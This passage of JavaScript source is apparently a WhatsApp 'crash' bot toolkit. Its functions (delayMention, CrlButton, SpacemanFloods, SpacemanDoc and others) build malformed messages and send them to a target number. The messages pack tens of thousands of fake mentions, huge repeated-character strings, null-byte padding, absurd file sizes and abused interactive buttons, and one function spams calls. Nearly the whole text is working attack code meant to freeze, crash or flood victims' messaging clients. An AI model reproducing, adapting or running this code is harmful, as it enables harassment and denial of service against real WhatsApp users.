tCKiTDjsp7crHk0cyHQc9NTTk7K9RQbFOvu+PJ/YAEfliG3AaiHzgAhuFUCkPPI+cVMP",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(targetNumber, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [targetNumber],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: targetNumber },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage(
      targetNumber,
      {
        message: {
          protocolMessage: {
            key: statusid.key,
            limitSharing: {
              sharingLimited: true,
              trigger: "BIZ_SUPPORTS_FB_HOSTING",
            },
            type: "PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE",
          },
        },
      },
      {}
    );
  } catch (err) {
    console.log(err);
  }
}

async function delayMention(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "9999999",
                    height: 0,
                    width: 0,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻" },
                        content: undefined
                    }
                ]
            }
        );
}

async function delayInfinity(jid) {
  const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "156279385028392",
    songId: "870166291800508",
    author: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 " + "᭄".repeat(9999),
    title: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const offercersMesagge = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "999999999999",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "Halo Sayanggg........",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "Hay",
        body: `${"\u0000".repeat(9741)}`,
        mediaType: 1,
        renderLargerThumbnail: false,
        thumbnailUrl: null,
        sourceUrl: "https://t.me/kontols",
      },
      businessMessageForwardInfo: {
        businessOwnerJid: jid,
      },
      isSampled: true,
      mentionedJid: mentionjid,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "1@newsletter",
      serverMessageId: 1,
      newsletterName: `${"ꦾ".repeat(100)}`,
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: { offercersMesagge },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
          },
        ],
      },
    ],
  });
    await sock.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
}

async function Protocol8(isTarget) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xnxx-com" + "ោ៝".repeat(10000),
        title: "Spaceman☇ ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/sock",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 99999999,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 0,
        width: 0,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: "@ozzy"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };
const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "99999999",
            seconds: 99999999,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "<! Spaceman !>",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(isTarget, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [isTarget],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                }]
            }]
        });
    }
    
    for (const TagMsg of [msg1, msg2, msg3]) {
        await sock.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: TagMsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    } 
}

async function SpamCall(target) {
  await sock.offerCall(target, true);
}

async function CrlButton(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸 `
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/k5c6co.jpg" } }, 
                                            { upload: sock.waUploadToServer }
                                        )),
                                        title: `\u200B`.repeat(10000),
                                        gifPlayback: true,
                                        subtitle: '\u0000'.repeat(10000),
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: "ꦾ".repeat(120000) + "@0".repeat(90000)
                                    },
                                    footer: {
                                        text: "\u200B"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸 ",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"\u200B".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "review_order",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "payment_status",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "request_payment",
                                                buttonParamsJson: ""
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@rapip\",\"merchant_url\":\"https://www.youtube.com/@rapip\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            },
                                            {
                                                name: "requst_payement",
                                                buttonParamsJson: "\u100B".repeat(50000)
                                            },
                                            {
                                                name: "payment_method",
                                                buttonParamsJson: "\u0000".repeat(50000)
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: null }
    );
    await sock.relayMessage(isTarget, msg.message, {
        participant: { jid: isTarget },
        messageId: msg.key.id,
    });
}

async function CrlButtonX2(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/k5c6co.jpg" } }, 
                                            { upload: sock.waUploadToServer }
                                        )),
                                        title: `\u200B`.repeat(10000),
                                        gifPlayback: true,
                                        subtitle: '\u0000'.repeat(10000),
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: "ꦽ".repeat(120000) + "@0".repeat(90000)
                                    },
                                    footer: {
                                        text: "\u200B"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸 ",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"\u200B".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "review_order",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "payment_status",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "request_payment",
                                                buttonParamsJson: ""
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@rapip\",\"merchant_url\":\"https://www.youtube.com/@rapip\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            },
                                            {
                                                name: "requst_payement",
                                                buttonParamsJson: "\u100B".repeat(50000)
                                            },
                                            {
                                                name: "payment_method",
                                                buttonParamsJson: "\u0000".repeat(50000)
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: null }
    );
    await sock.relayMessage(isTarget, msg.message, {
        participant: { jid: isTarget },
        messageId: msg.key.id,
    });
}

async function SpacemanCall(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n",
              hasMediaAttachment: false,
            },
            body: {
              text: "ꦽ".repeat(12000) + "@0".repeat(90000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻",
                },
                {
                  name: "review_order",
                  buttonParamsJson: "",
                },
                {
                  name: "payment_request",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function SpacemanOld(target) {
const mentionedList = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
    `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];    
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: mentionedList,
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n" + "ꦾ".repeat(90000) + "@1".repeat(90000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                              "name": "cta_copy",
                              "buttonParamsJson": `{\"display_text\":\"👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻\",\"id\":\"123456789\",\"copy_code\":\"Kontol\"}`
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: venomModsData + "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n",                            
                            },
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, message, {
        participant: {
            jid: target
        },
    })
}

async function SpacemanFloods(target) {
      const buttonMessage = "ꦾ".repeat(90000) + "@1".repeat(60000);
      await sock.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: {
                      title: " 👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n  ",
                      locationMessage: {},
                      hasMediaAttachment: true,
                    },
                    body: {
                      text: buttonMessage,
                    },
                    nativeFlowMessage: {
                      name: "call_permission_request",
                      messageParamsJson: venomModsData + "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n",
                    },
                    carouselMessage: {},
                  },
                },
              },
            },
          },
        },
        {
              participant: {
                jid: target,
              },
            }
      );
}

async function SpacemanXButton(target) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 ",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/9eqqk7.jpg" } }, { upload: sock.waUploadToServer }))
      },
      body: {
        text: "ꦾ".repeat(120000) + "@0".repeat(55555)
      },
      footer: {
        text: "\u200B"
      },
      nativeFlowMessage: {
        messageParamsJson: venomModsData
      }
    }
}), { userJid: target, quoted: null });
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function SpacemanSpamNotif(isTarget) {
    let virtex = "ꦽ".repeat(120000) + "@1".repeat(50000);
    await sock.relayMessage(isTarget, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "MAKLO YAPIT",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 ",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: isTarget } }, { messageId: null });
}

async function SpacemanDoc(jid) {
    await sock.relayMessage(jid, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/pdf",
                            fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                            fileLength: "1099511627776", // 1 TB (fake size)
                            pageCount: 199183729199991,  // absurdly large
                            mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                            fileName: "YATIM",
                            fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                            directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1728631701",
                            contactVcard: true
                        }
                    },
                    hasMediaAttachment: true,
                    body: {
                        text: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 " + "ꦿꦸ".repeat(120000) + "@1".repeat(70000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"KONTOL\",\"body\":\"Call Galaxy\"}",
                        buttons: [
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 2000000, offset: 100 },
                                    reference_id: "4R0F79457Q7",
                                    type: "physical-goods",
                                    order: {
                                        status: "payment_requested",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                            {
                                                retailer_id: "custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de",
                                                name: "CROT",
                                                amount: { value: 2000000, offset: 100 },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "CROT",
                                    native_payment_methods: [],
                                    share_payment_status: true
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "120363404154098043@newsletter"),
                        groupMentions: [
                            {
                                groupJid: "120363404154098043@newsletter",
                                groupSubject: "Open VCS"
                            }
                        ]
                    }
                }
            }
        }
    }, {
        participant: { jid: jid }
    });
}

async function SpacemanInvis(X) {
   let etc = generateWAMessageFromContent(X,
    proto.Message.fromObject({
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         title: "⭑‌⟅ ༑ 👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n  * ",
         "locationMessage": {
          "degreesLatitude": -999.03499999999999,
          "degreesLongitude": 922.999999999999,
          "name": "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n🐉",
          "address": "🎭⃟༑⌁⃰👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n🐉",
          "jpegThumbnail": null //null bs jg
         },
         hasMediaAttachment: true
        },
        body: {
         text: "ꦽ".repeat(120000) + "@1".repeat(90000)
        },
        nativeFlowMessage: {
         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"KONTOL\",\"body\":\"Call Galaxy\"}",
         buttons: [{
           name: "single_select",
           buttonParamsJson: {
